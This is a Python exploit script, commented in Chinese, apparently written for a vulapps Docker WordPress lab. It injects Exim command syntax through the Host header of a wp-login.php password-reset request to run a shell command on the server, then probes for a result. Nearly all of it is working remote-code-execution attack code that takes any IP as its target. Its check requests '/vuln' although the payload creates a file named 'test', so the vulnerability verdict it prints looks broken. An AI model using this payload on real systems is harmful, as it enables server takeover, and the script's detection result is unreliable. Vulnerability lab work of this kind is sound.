#!/usr/bin/env python
# -*- coding: utf-8 -*-
# python version 3.6.4
# 简介：
# 脚本适用于docker下的vulapps环境，使用
# docker run -d -p 80:80 medicean/vulapps:w_wordpress_6
# 可直接运行。
# 具体信息参见github地址
# https://github.com/Medicean/VulApps/tree/master/w/wordpress/6

import sys
import traceback
import http.client
import urllib.parse

argc = len(sys.argv) - 1
argv = sys.argv[1:]
if argc == -1 or argc > 2:
    print("用法：python",sys.argv[0],"IP地址 端口号")
    print("例如：url为http://127.0.0.1:8080/，则IP地址应为127.0.0.1，端口号应为8080")
    sys.exit()

ip = "192.168.13.129"
port = 80

if argc >= 1:
    ip = argv[0]
if argc == 2:
    port = argv[1]

try:
    conn = http.client.HTTPConnection(ip, port)
except http.client.HTTPException as e:
    print(repr(e))
    traceback.print_exc()

try:
    _body = {"wp-submit":"Get New Password", "redirect_to":"", "user_login":"admin"}
    url = "/wp-login.php?action=lostpassword"
    body = urllib.parse.urlencode(_body)
    header = {"Host":"target(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}touch${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}var${substr{0}{1}{$spool_directory}}www${substr{0}{1}{$spool_directory}}html${substr{0}{1}{$spool_directory}}test}} null)", "Connection":"close", "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:53.0) Gecko/20100101 Firefox/53.0", "Accept":"*/*", "Content-Length":len(body), "Content-Type":"application/x-www-form-urlencoded"}
    conn.request("POST", url, body, header)

    resp = conn.getresponse()
    resp.read()

    url = "/vuln"
    conn.request("GET", url)

    resp = conn.getresponse()
    if resp.getcode() == 200:
        print("目标存在漏洞")
    else:
        print("目标不存在漏洞")

except http.client.HTTPException as e:
    print(repr(e))
    traceback.print_exc()
    
